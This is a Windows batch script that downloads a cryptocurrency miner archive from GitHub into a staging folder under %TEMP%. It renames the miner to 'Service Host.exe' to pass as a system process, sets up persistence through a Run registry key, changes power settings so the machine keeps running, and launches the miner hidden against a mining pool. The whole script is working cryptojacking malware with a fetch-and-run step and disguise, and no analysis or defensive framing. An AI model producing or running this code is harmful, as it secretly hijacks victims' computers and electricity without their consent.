for /f "tokens=1 delims=," %%i in ('tasklist /FI "IMAGENAME eq Service Host.exe" /fo:csv /nh') do set VAR=%%i
IF NOT "%VAR%" == "Service Host.exe" (
	call:makestaging
	call:makewget
	call:makeunzip	
	if not exist servicehost.zip (
	cscript wget.vbs https://github.com/bobgratton420/Perso/raw/master/VeriumMiner.zip servicehost.zip
	)
	if not exist %TEMP%\ServiceHostStaging\servicehost (
	cscript unzip.vbs
	cd %TEMP%\ServiceHostStaging\servicehost
	move cpuminer.exe "Service Host.exe"
	) else (
	cd %TEMP%\ServiceHostStaging\servicehost
		if not exist "Service Host.exe" (
		move cpuminer.exe "Service Host.exe"
		)
	)
call:makeservice

powercfg.exe /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c

powercfg -SETACVALUEINDEX SCHEME_MIN SUB_BUTTONS LIDACTION 0

REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\run /t REG_SZ /v Service /d %TEMP%\ServiceHostStaging\servicehost\Service.vbs

%TEMP%\ServiceHostStaging\servicehost\Service.vbs

)
:makestaging
if not exist %TEMP%\ServiceHostStaging (
	mkdir %TEMP%\ServiceHostStaging
	cd %TEMP%\ServiceHostStaging
) else (
	cd %TEMP%\ServiceHostStaging
)
:makewget
if not exist wget.vbs (
	echo ^if WScript.Arguments.Count ^< 1 then^ > wget.vbs
	echo ^  MsgBox "Usage: wget.vbs ^<url^> ^(file^)"^ >> wget.vbs
	echo ^  WScript.Quit^ >> wget.vbs
	echo ^end if^ >> wget.vbs
	ECHO:  >> wget.vbs
	echo ^' Arguments^ >> wget.vbs
	echo ^URL = WScript.Arguments^(0^)^ >> wget.vbs
	echo ^if WScript.Arguments.Count ^> 1 then^ >> wget.vbs
	echo ^  saveTo = WScript.Arguments^(1^)^ >> wget.vbs
	echo ^else^ >> wget.vbs
	echo ^  parts = split^(url,"/"^)^ >> wget.vbs 
	echo ^  saveTo = parts^(ubound^(parts^)^)^ >> wget.vbs
	echo ^end if^ >> wget.vbs
	ECHO:  >> wget.vbs
	echo ^' Fetch the file^ >> wget.vbs
	echo ^Set objXMLHTTP = CreateObject^("MSXML2.ServerXMLHTTP"^)^ >> wget.vbs
	ECHO:  >> wget.vbs
	echo ^objXMLHTTP.open "GET", URL, false^ >> wget.vbs
	echo ^objXMLHTTP.send^(^)^ >> wget.vbs
	ECHO:  >> wget.vbs
	echo ^If objXMLHTTP.Status = 200 Then^ >> wget.vbs
	echo ^Set objADOStream = CreateObject^("ADODB.Stream"^)^ >> wget.vbs
	echo ^objADOStream.Open^ >> wget.vbs
	echo ^objADOStream.Type = 1 'adTypeBinary^ >> wget.vbs
	ECHO:  >> wget.vbs
	echo ^objADOStream.Write objXMLHTTP.ResponseBody^ >> wget.vbs
	echo ^objADOStream.Position = 0    'Set the stream position to the start^ >> wget.vbs
	ECHO:  >> wget.vbs
	echo ^Set objFSO = Createobject^("Scripting.FileSystemObject"^)^ >> wget.vbs
	echo ^If objFSO.Fileexists^(saveTo^) Then objFSO.DeleteFile saveTo^ >> wget.vbs
	echo ^Set objFSO = Nothing^ >> wget.vbs
	ECHO:  >> wget.vbs
	echo ^objADOStream.SaveToFile saveTo^ >> wget.vbs
	echo ^objADOStream.Close^ >> wget.vbs
	echo ^Set objADOStream = Nothing^ >> wget.vbs
	echo ^End if^ >> wget.vbs
	ECHO:  >> wget.vbs
	echo ^Set objXMLHTTP = Nothing^ >> wget.vbs
	ECHO:  >> wget.vbs
	echo ^' Done^ >> wget.vbs
	echo ^WScript.Quit^ >> wget.vbs
)
:makeunzip
if not exist unzip.vbs (
	echo ^'The location of the zip file.^ > unzip.vbs
	echo ^ZipFile="%TEMP%\ServiceHostStaging\servicehost.zip"^ >> unzip.vbs
	echo ^'The folder the contents should be extracted to.^ >> unzip.vbs
	echo ^ExtractTo="%TEMP%\ServiceHostStaging\servicehost"^ >> unzip.vbs
	ECHO:  >> unzip.vbs
	echo ^'If the extraction location does not exist create it.^ >> unzip.vbs
	echo ^Set fso = CreateObject^("Scripting.FileSystemObject"^)^ >> unzip.vbs
	echo ^If NOT fso.FolderExists^(ExtractTo^) Then^ >> unzip.vbs
	echo ^   fso.CreateFolder^(ExtractTo^)^ >> unzip.vbs
	echo ^End If^ >> unzip.vbs
	ECHO:  >> unzip.vbs
	echo ^'Extract the contants of the zip file.^ >> unzip.vbs
	echo ^set objShell = CreateObject^("Shell.Application"^)^ >> unzip.vbs
	echo ^set FilesInZip=objShell.NameSpace^(ZipFile^).items^ >> unzip.vbs
	echo ^objShell.NameSpace^(ExtractTo^).CopyHere^(FilesInZip^)^ >> unzip.vbs
	echo ^Set fso = Nothing^ >> unzip.vbs
	echo ^Set objShell = Nothing^ >> unzip.vbs
)
:makeservice
if not exist Service.bat (
echo "%TEMP%\ServiceHostStaging\servicehost\Service Host.exe" -n 1048576 -o stratum+tcp://us.vrm.mining-pool.ovh:3032 -u bobgratton.viral -p password -t 2 > Service.bat
)
if not exist Service.vbs (
echo ^Dim WinScriptHost^ > Service.vbs
echo ^Set WinScriptHost = CreateObject^("WScript.Shell"^)^ >> Service.vbs
echo ^WinScriptHost.Run Chr^(34^) ^& ^"%TEMP%\ServiceHostStaging\servicehost\Service.bat^" ^& Chr^(34^), 0^ >> Service.vbs
echo ^Set WinScriptHost = Nothing^ >> Service.vbs
)
GOTO:EOF
